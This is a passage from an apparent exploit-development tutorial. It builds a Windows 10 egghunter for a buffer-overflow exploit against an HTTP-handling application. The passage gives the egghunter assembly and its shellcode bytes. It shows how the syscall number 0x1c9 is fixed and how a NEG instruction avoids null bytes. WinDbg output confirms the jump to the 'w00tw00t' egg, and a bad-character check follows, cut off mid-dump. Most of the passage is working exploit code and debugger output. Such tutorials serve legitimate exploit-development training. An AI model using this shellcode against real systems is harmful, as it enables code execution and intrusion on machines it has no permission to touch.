</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">#</span> counter by one
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; jnz loop_inc_one ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">#</span> First part of the egg detected, check <span style="color:#66d9ef">for</span>  
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">#</span> the second part
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; scasd ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">#</span> No match, we found just a location  
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">#</span> with half an egg
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; jnz loop_inc_one ;&#34;</span>  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; matched: &#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">#</span> The edi <span style="color:#66d9ef">register</span> points to the first  
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">#</span> byte of our buffer, we can jump to it
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; jmp edi ;&#34;</span>  
</span></span></code></pre></div><p>We load the &ldquo;egg&rdquo; we want to search into the EAX register.
We mov the pointer of the memory we are scanning to EDI.
We use the <code>scasd</code> operation to compare EAX (the egg) with the dword at EDI (this means the dword at the start of memory region). Such operation will automatically increment EDI by a DWORD, displacing it as we want. In case that there is no match, we increment the memory counter by one <strong>inside such memory region.</strong>
In case that there is match, the match is only for the first dword, the first half of the egg, and we perform the <code>scasd</code> operation again to check for the other half egg. In case that both <code>scasd</code> operations are successful, we won&rsquo;t increment the counters inside the memory region but we will reach to the <code>matched</code> tag, which is a <code>jmp</code> edi (EDI at this point will store the location where the egg was found).</p>
<p>Interesting note about this egghunter: The original code from Matt Miller used the NtDisplayString1 system call, exploiting the very same concept. However, Miller realized that the use of the NtAccessCheckAndAuditAlarm system call was actually improving the portability of the egghunter. This is due to the fact that the NtAccessCheckAndAuditAlarm system call number (0x02) didn’t change across different operating systems versions, compared to the one for NtDisplayString, which changed between Windows versions.</p>
<p>Once we understood our egghunter, let&rsquo;s use Keystone to obtain the opcodes:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>egghunter <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7</span><span style="color:#e6db74">&#34;</span>)
</span></span></code></pre></div><p>We must replace these values for the &ldquo;A&rdquo; buffer after the HTTP method (remember that we modified the HTTP method to a routine to do a short jump to our &ldquo;A&rdquo; buffer. Now, we want to jump to the egghunter and find our other buffer).</p>
<p>Let&rsquo;s put a breakpoint on the POP, RET and analyze if everything works until the egghunter (and confirm if the egghunter code is not mangled):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>ea8d <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>ea8e <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>ea8f <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>ea90 <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>ea91 <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>ea92 <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>ea93 <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>ea94 <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>ea95 <span style="color:#ae81ff">6681</span>caff0f      or      dx,<span style="color:#ae81ff">0FF</span>Fh
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>ea9a <span style="color:#ae81ff">42</span>              inc     edx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>ea9b <span style="color:#ae81ff">52</span>              push    edx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>ea9c <span style="color:#ae81ff">6</span>a02            push    <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>ea9e <span style="color:#ae81ff">58</span>              pop     eax
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>ea9f cd2e            <span style="color:#66d9ef">int</span>     <span style="color:#ae81ff">2</span>Eh
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>eaa1 <span style="color:#ae81ff">3</span>c05            cmp     al,<span style="color:#ae81ff">5</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>eaa3 <span style="color:#ae81ff">5</span>a              pop     edx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>eaa4 <span style="color:#ae81ff">74</span>ef            je      <span style="color:#ae81ff">0472</span>ea95
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>eaa6 b877303074      mov     eax,<span style="color:#ae81ff">74303077</span>h
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>eaab <span style="color:#ae81ff">89</span>d7            mov     edi,edx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>eaad af              scas    dword ptr es:[edi]
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>eaae <span style="color:#ae81ff">75</span>ea            jne     <span style="color:#ae81ff">0472</span>ea9a
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>eab0 af              scas    dword ptr es:[edi]
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>eab1 <span style="color:#ae81ff">75e7</span>            jne     <span style="color:#ae81ff">0472</span>ea9a
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>eab3 ffe7            jmp     edi
</span></span></code></pre></div><p>Our egghunter code is present in memory and appears to be intact. It should find our &ldquo;w00tw00t&rdquo; egg, which is here:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> s <span style="color:#f92672">-</span>a <span style="color:#ae81ff">0x0</span> L<span style="color:#f92672">?</span><span style="color:#ae81ff">80000000</span> w00tw00t
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b38186  <span style="color:#ae81ff">77</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">74</span> <span style="color:#ae81ff">77</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">74</span><span style="color:#f92672">-</span><span style="color:#ae81ff">44</span> <span style="color:#ae81ff">44</span> <span style="color:#ae81ff">44</span> <span style="color:#ae81ff">44</span> <span style="color:#ae81ff">44</span> <span style="color:#ae81ff">44</span> <span style="color:#ae81ff">44</span> <span style="color:#ae81ff">44</span>  w00tw00tDDDDDDDD
</span></span></code></pre></div><p>However, if we put a breakpoint in the address of the egg, and we continue the program, it keeps infinitely running and the breakpoint is not hit, meaning that it has not been able to find our egg buffer. We know the buffer is stored in memory so the problem is in our egghunter code.</p>
<p>While we can find plenty of exploits publicly available that include this egghunter, it appears that they are all targeting applications on Windows 7 or prior. This means that some changes occurred in between Windows 7 and Windows 10 that break the functionality of our egghunter. <strong>This means that it is possible that the egghunter that we used does not work in Windows 10 for some reason.</strong></p>
<p>Indeed, it does not work because of the <strong>SSN we have used. We have used the SSN 0x02 but this SSN is different in our Windows for the syscall we want to perform.</strong> Let&rsquo;s check the official function in ntdll to see which SSN it is using:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>NtAccessCheckAndAuditAlarm:
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77</span>cd24d0 b8c9010000      mov     eax,<span style="color:#ae81ff">1</span>C9h
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77</span>cd24d5 e803000000      call    ntdll<span style="color:#f92672">!</span>NtAccessCheckAndAuditAlarm<span style="color:#f92672">+</span><span style="color:#ae81ff">0xd</span> (<span style="color:#ae81ff">77</span>cd24dd)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77</span>cd24da c22c00          ret     <span style="color:#ae81ff">2</span>Ch
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77</span>cd24dd <span style="color:#ae81ff">8</span>bd4            mov     edx,esp
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77</span>cd24df <span style="color:#ae81ff">0f</span><span style="color:#ae81ff">34</span>            sysenter
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77</span>cd24e1 c3              ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77</span>cd24e2 <span style="color:#ae81ff">8</span>da42400000000  lea     esp,[esp]
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77</span>cd24e9 <span style="color:#ae81ff">8</span>da42400000000  lea     esp,[esp]
</span></span></code></pre></div><p>Based on this output, the SSN is 0x1c9. Let&rsquo;s change the script to replace our PUSH 0x02 instruction to push 0x1c9. Let&rsquo;s see the resulting egghunter:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>egghunter <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x66\x81\xca\xff\x0f\x42\x52\x68\xc9\x01\x00\x00\x58\xcd\x2e\x3c\x05\x5a\x74\xec\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75\xe7\xaf\x75\xe4\xff\xe7</span><span style="color:#e6db74">&#34;</span>)
</span></span></code></pre></div><p>So bad! Our new egghunter has null bytes! These null bytes are bad characters and will prevent us from crashing the application.
We have to modify the code of the egghunter a bit so that it does the same, but these bytes do not appear.
We are going to use the NEG assembly instruction. We need to generate a negative value that, when substracted from 0x00, will result in 0x1c9.
Let&rsquo;s examine how we can do this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">?</span> <span style="color:#ae81ff">0x0</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1c9</span>
</span></span><span style="display:flex;"><span>Evaluate expression: <span style="color:#f92672">-</span><span style="color:#ae81ff">457</span> <span style="color:#f92672">=</span> fffffe37
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">?</span> <span style="color:#ae81ff">0x0</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0xfffffe37</span>
</span></span><span style="display:flex;"><span>Evaluate expression: <span style="color:#f92672">-</span><span style="color:#ae81ff">4294966839</span> <span style="color:#f92672">=</span> ffffffff<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">000001</span>c9
</span></span></code></pre></div><p>We begin by substracting the value we want to obtain from 0x0. This will give us our number but in negative value.
If we negate the obtained value, we obtain a QWORD (64 bytes) but <strong>because we are running on a 32 bit architecture, the result WE WANT will be stored in the lower DWORD of the total value (000001c9)</strong>.</p>
<p>Therefore, we can replace this instruction:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e6db74">&#34; push 0x1c9 ;&#34;</span>
</span></span></code></pre></div><p>for these ones:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span> <span style="color:#75715e"># Push the system call number negated 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> <span style="color:#e6db74">&#34; mov eax, 0xfffffe37;&#34;</span>  
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Negate it again  
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#e6db74">&#34; neg eax;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">#</span> Initialize the call to NtAccessCheckAndAuditAlarm  
</span></span><span style="display:flex;"><span><span style="color:#75715e"># &#34; pop eax ;&#34;
</span></span></span></code></pre></div><p>We don&rsquo;t want to pop EAX anymore, as we already have the value in EAX.
Let&rsquo;s check if the egghunter is mangled:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> u <span style="color:#ae81ff">0472</span>ea8f L26
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>ea8f <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>ea90 <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>ea91 <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>ea92 <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>ea93 <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>ea94 <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>ea95 <span style="color:#ae81ff">6681</span>caff0f      or      dx,<span style="color:#ae81ff">0FF</span>Fh
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>ea9a <span style="color:#ae81ff">42</span>              inc     edx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>ea9b <span style="color:#ae81ff">52</span>              push    edx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>ea9c b837feffff      mov     eax,<span style="color:#ae81ff">0FF</span>FFFE37h
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>eaa1 f7d8            neg     eax
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>eaa3 cd2e            <span style="color:#66d9ef">int</span>     <span style="color:#ae81ff">2</span>Eh
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>eaa5 <span style="color:#ae81ff">3</span>c05            cmp     al,<span style="color:#ae81ff">5</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>eaa7 <span style="color:#ae81ff">5</span>a              pop     edx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>eaa8 <span style="color:#ae81ff">74</span>eb            je      <span style="color:#ae81ff">0472</span>ea95
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>eaaa b877303074      mov     eax,offset windows_storage<span style="color:#f92672">!</span>CImageManager<span style="color:#f92672">::</span>OnLoadOverlayCompleted<span style="color:#f92672">+</span><span style="color:#ae81ff">0x17</span> (<span style="color:#ae81ff">74303077</span>)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>eaaf <span style="color:#ae81ff">89</span>d7            mov     edi,edx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>eab1 af              scas    dword ptr es:[edi]
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>eab2 <span style="color:#ae81ff">75e6</span>            jne     <span style="color:#ae81ff">0472</span>ea9a
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>eab4 af              scas    dword ptr es:[edi]
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>eab5 <span style="color:#ae81ff">75e3</span>            jne     <span style="color:#ae81ff">0472</span>ea9a
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>eab7 ffe7            jmp     edi
</span></span></code></pre></div><p>Fantastic, all of our egghunter does not contain badchars and is not mangled.
Now, let&rsquo;s put a breakpoint on the jmp edi instruction and see what does edi have:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> g
</span></span><span style="display:flex;"><span>Breakpoint <span style="color:#ae81ff">1</span> hit
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">74303077</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>a2bf0 ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">0472</span>ea20 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">04</span>b38186 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>a2bf0 edi<span style="color:#f92672">=</span><span style="color:#ae81ff">04</span>b3818e
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">0472</span>eab7 esp<span style="color:#f92672">=</span><span style="color:#ae81ff">0472</span>ea24 ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">41414141</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000246</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>eab7 ffe7            jmp     edi {<span style="color:#ae81ff">04</span>b3818e}
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> dds edi
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b3818e  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b38192  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b38196  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b3819a  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b3819e  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b381a2  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b381a6  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b381aa  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b381ae  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b381b2  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b381b6  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b381ba  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b381be  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b381c2  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b381c6  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b381ca  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b381ce  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b381d2  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b381d6  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b381da  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b381de  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b381e2  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b381e6  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b381ea  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b381ee  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b381f2  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b381f6  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b381fa  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b381fe  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b38202  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b38206  <span style="color:#ae81ff">44444444</span>
</span></span></code></pre></div><p>Fantastic, just after our egg:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> s <span style="color:#f92672">-</span>a <span style="color:#ae81ff">0x0</span> L<span style="color:#f92672">?</span><span style="color:#ae81ff">80000000</span> w00tw00t
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b38186  <span style="color:#ae81ff">77</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">74</span> <span style="color:#ae81ff">77</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">74</span><span style="color:#f92672">-</span><span style="color:#ae81ff">44</span> <span style="color:#ae81ff">44</span> <span style="color:#ae81ff">44</span> <span style="color:#ae81ff">44</span> <span style="color:#ae81ff">44</span> <span style="color:#ae81ff">44</span> <span style="color:#ae81ff">44</span> <span style="color:#ae81ff">44</span>  w00tw00tDDDDDDDD
</span></span></code></pre></div><p>Lastly, we have checked if badchars are present in all of the code we have inserted but not on the payload that is going to execute. Let&rsquo;s insert a badchar array and check if any of the badchars is present:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> s <span style="color:#f92672">-</span>a <span style="color:#ae81ff">0x0</span> L<span style="color:#f92672">?</span><span style="color:#ae81ff">80000000</span> w00tw00t
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>c38186  <span style="color:#ae81ff">77</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">74</span> <span style="color:#ae81ff">77</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">74</span><span style="color:#f92672">-</span><span style="color:#ae81ff">01</span> <span style="color:#ae81ff">02</span> <span style="color:#ae81ff">03</span> <span style="color:#ae81ff">04</span> <span style="color:#ae81ff">05</span> <span style="color:#ae81ff">06</span> <span style="color:#ae81ff">07</span> <span style="color:#ae81ff">08</span>  w00tw00t........
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> db <span style="color:#ae81ff">04</span>c38186  L110
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>c38186  <span style="color:#ae81ff">77</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">74</span> <span style="color:#ae81ff">77</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">74</span><span style="color:#f92672">-</span><span style="color:#ae81ff">01</span> <span style="color:#ae81ff">02</span> <span style="color:#ae81ff">03</span> <span style="color:#ae81ff">04</span> <span style="color:#ae81ff">05</span> <span style="color:#ae81ff">06</span> <span style="color:#ae81ff">07</span> <span style="color:#ae81ff">08</span>  w00tw00t........
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>c38196  <span style="color:#ae81ff">09</span> <span style="color:#ae81ff">0</span>b <span style="color:#ae81ff">0</span>c <span style="color:#ae81ff">0</span>e <span style="color:#ae81ff">0f</span> <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">11</span> <span style="color:#ae81ff">12</span><span style="color:#f92672">-</span><span style="color:#ae81ff">13</span> <span style="color:#ae81ff">14</span> <span style="color:#ae81ff">15</span> <span style="color:#ae81ff">16</span> <span style="color:#ae81ff">17</span> <span style="color:#ae81ff">18</span> <span style="color:#ae81ff">19</span> <span style="color:#ae81ff">1</span>a  ................
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>c381a6  <span style="color:#ae81ff">1</span>b <span style="color:#ae81ff">1</span>c <span style="color:#ae81ff">1</span>d <span style="color:#ae81ff">1</span>e <span style="color:#ae81ff">1f</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">21</span> <span style="color:#ae81ff">22</span><span style="color:#f92672">-</span><span style="color:#ae81ff">23</span> <span style="color:#ae81ff">24</span> <span style="color:#ae81ff">26</span> <span style="color:#ae81ff">27</span> <span style="color:#ae81ff">28</span> <span style="color:#ae81ff">29</span> <span style="color:#ae81ff">2</span>a <span style="color:#ae81ff">2</span>b  ..... <span style="color:#f92672">!</span><span style="color:#e6db74">&#34;#$&amp;&#39;()*+</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>c381b6  <span style="color:#ae81ff">2</span>c <span style="color:#ae81ff">2</span>d <span style="color:#ae81ff">2</span>e <span style="color:#ae81ff">2f</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">31</span> <span style="color:#ae81ff">32</span> <span style="color:#ae81ff">33</span><span style="color:#f92672">-</span><span style="color:#ae81ff">34</span> <span style="color:#ae81ff">35</span> <span style="color:#ae81ff">36</span> <span style="color:#ae81ff">37</span> <span style="color:#ae81ff">38</span> <span style="color:#ae81ff">39</span> <span style="color:#ae81ff">3</span>a <span style="color:#ae81ff">3</span>b  ,<span style="color:#f92672">-</span>.<span style="color:#f92672">/</span><span style="color:#ae81ff">01234567</span><span style="color:#ae81ff">89</span><span style="color:#f92672">:</span>;
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>c381c6  <span style="color:#ae81ff">3</span>c <span style="color:#ae81ff">3</span>d <span style="color:#ae81ff">3</span>e <span style="color:#ae81ff">3f</span> <span style="color:#ae81ff">40</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">42</span> <span style="color:#ae81ff">43</span><span style="color:#f92672">-</span><span style="color:#ae81ff">44</span> <span style="color:#ae81ff">45</span> <span style="color:#ae81ff">46</span> <span style="color:#ae81ff">47</span> <span style="color:#ae81ff">48</span> <span style="color:#ae81ff">49</span> <span style="color:#ae81ff">4</span>a <span style="color:#ae81ff">4</span>b  <span style="color:#f92672">&lt;=&gt;?</span><span style="color:#960050;background-color:#1e0010">@</span>ABCDEFGHIJK
